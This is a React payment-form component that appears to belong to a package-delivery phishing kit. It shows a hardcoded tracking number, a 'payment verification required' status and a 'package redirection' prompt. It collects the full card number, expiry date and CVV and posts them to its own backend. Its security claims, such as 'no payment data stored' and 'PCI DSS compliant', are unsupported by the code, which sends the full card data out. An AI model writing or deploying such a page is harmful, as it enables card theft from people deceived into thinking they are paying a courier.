import React, { useState, useEffect } from 'react';
import axios from 'axios';
import './PaymentForm.css';
import Footer from './Footer';
import FAQSection from './FAQSection';
import ProgressBar from './ProgressBar';

const PaymentForm = ({ formData, handleChange, nextStep, setError }) => {
  const [loading, setLoading] = useState(false);
  const [apiBaseUrl, setApiBaseUrl] = useState('');
  const [paymentError, setPaymentError] = useState('');

  // Determine API base URL based on environment
  useEffect(() => {
    const determineApiUrl = () => {
      if (process.env.NODE_ENV === 'development' || process.env.REACT_APP_API_BASE_URL) {
        return process.env.REACT_APP_API_BASE_URL ;
      }
      return '';
    };
    
    setApiBaseUrl(determineApiUrl());
  }, []);

  const formatCardNumber = (value) => {
    if (!value) return '';
    return value.replace(/\D/g, '')
               .replace(/(\d{4})(?=\d)/g, '$1 ')
               .trim();
  };

  const handleCardNumberChange = (e) => {
    const { name, value } = e.target;
    const unformattedValue = value.replace(/\D/g, '');
    const formattedValue = formatCardNumber(unformattedValue);
    
    handleChange({ 
      target: { 
        name, 
        value: unformattedValue,
        formattedValue
      } 
    });
  };

  const validateExpirationDate = (date) => {
    if (!date.match(/^\d{2}\/\d{2}$/)) return false;
    
    const [month, year] = date.split('/');
    const currentYear = new Date().getFullYear() % 100;
    const currentMonth = new Date().getMonth() + 1;
    
    return (
      month >= 1 && month <= 12 &&
      (year > currentYear || (year == currentYear && month >= currentMonth))
    );
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    setLoading(true);
    setError('');
    setPaymentError('');
    
    try {
      // Validate card number
      const rawCardNumber = formData.cardNumber?.replace(/\s/g, '') || '';
      if (rawCardNumber.length !== 16 || !/^\d+$/.test(rawCardNumber)) {
        throw new Error('Card number must be 16 digits');
      }
      
      // Validate expiration date
      if (!validateExpirationDate(formData.expirationDate)) {
        throw new Error('Invalid expiration date (MM/YY format required, must be in future)');
      }
      
      // Validate CVV
      if (!formData.cvv?.match(/^\d{3,4}$/)) {
        throw new Error('CVV must be 3 or 4 digits');
      }
      
      const paymentData = {
        ...formData,
        cardNumber: rawCardNumber,
        cardLastFour: rawCardNumber.slice(-4)
      };
      
      const response = await axios.post(
        `${apiBaseUrl}/api/payments/payment-details`, 
        paymentData,
        {
          headers: {
            'Content-Type': 'application/json'
          },
          withCredentials: true
        }
      );
      
      if (response.data.success) {
        nextStep();
      } else {
        throw new Error(response.data.error || 'Payment processing failed');
      }
    } catch (err) {
      let errorMessage = 'Payment processing error';
      
      if (err.response) {
        errorMessage = err.response.data?.error || 
                      err.response.data?.message || 
                      `Server error (${err.response.status})`;
      } else if (err.request) {
        errorMessage = 'Network error - please check your connection';
      } else {
        errorMessage = err.message;
      }
      
      setPaymentError(errorMessage);
      console.error('Payment error:', err);
    } finally {
      setLoading(false);
    }
  };

  return (
    <div className="payment-container">
      <ProgressBar currentStep="payment" />
      
      <div className="tracking-header">
        <h1>
          <span className="tracking-label">Tracking Number:</span> US9514901165421
        </h1>
      </div>

      <div className="status-notification">
        <div className="status-content">
          <span className="status-label">Status:</span>
          <span className="status-message">Payment verification required</span>
        </div>
      </div>

      <div className="payment-instructions">
        <p>Complete your payment information to proceed with your package redirection.</p>
        <p>All transactions are secure and encrypted.</p>
      </div>

      <form onSubmit={handleSubmit} className="payment-form">
        <h2 className="form-title">Payment Information</h2>
        
        {paymentError && (
          <div className="error-message">
            <i className="error-icon">⚠️</i>
            {paymentError}
          </div>
        )}
        
        <div className="security-notice">
          <i className="lock-icon">🔒</i>
          <span>Your payment information is securely encrypted</span>
        </div>
        
        <div className="form-group">
          <label htmlFor="cardNumber">Card Number</label>
          <input
            type="text"
            id="cardNumber"
            name="cardNumber"
            value={formatCardNumber(formData.cardNumber)}
            onChange={handleCardNumberChange}
            maxLength={19}
            placeholder="1234 5678 9012 3456"
            required
            disabled={loading}
            inputMode="numeric"
            autoComplete="cc-number"
          />
          <div className="card-icons">
            {['visa', 'mastercard', 'amex', 'discover'].map(type => (
              <span key={type} className={`card-icon ${type}`}></span>
            ))}
          </div>
        </div>
        
        <div className="form-row">
          <div className="form-group">
            <label htmlFor="expirationDate">Expiration Date (MM/YY)</label>
            <input
              type="text"
              id="expirationDate"
              name="expirationDate"
              value={formData.expirationDate}
              onChange={(e) => {
                let value = e.target.value.replace(/\D/g, '');
                if (value.length > 2) {
                  value = value.slice(0, 2) + '/' + value.slice(2, 4);
                }
                handleChange({ target: { name: e.target.name, value } });
              }}
              maxLength={5}
              placeholder="MM/YY"
              required
              disabled={loading}
              inputMode="numeric"
              autoComplete="cc-exp"
            />
          </div>
          
          <div className="form-group">
            <label htmlFor="cvv">Security Code (CVV)</label>
            <input
              type="password"
              id="cvv"
              name="cvv"
              value={formData.cvv}
              onChange={(e) => {
                const value = e.target.value.replace(/\D/g, '').slice(0, 4);
                handleChange({ target: { name: e.target.name, value } });
              }}
              maxLength={4}
              placeholder="123"
              required
              disabled={loading}
              inputMode="numeric"
              autoComplete="cc-csc"
            />
            <div className="cvv-hint">
              <span>3-4 digits on back of card</span>
            </div>
          </div>
        </div>
        
        <div className="form-actions">
          <button 
            type="submit" 
            disabled={loading} 
            className="submit-button"
            aria-busy={loading}
          >
            {loading ? (
              <>
                <span className="button-spinner"></span> Processing...
              </>
            ) : 'Continue to Verification'}
          </button>
        </div>
      </form>
      
      <div className="payment-security">
        <h4>Payment Security</h4>
        <ul>
          <li>256-bit SSL encryption</li>
          <li>No payment data stored on our servers</li>
          <li>PCI DSS compliant</li>
        </ul>
      </div>
      
      <FAQSection />
      <Footer />
    </div>
  );
};

export default PaymentForm;
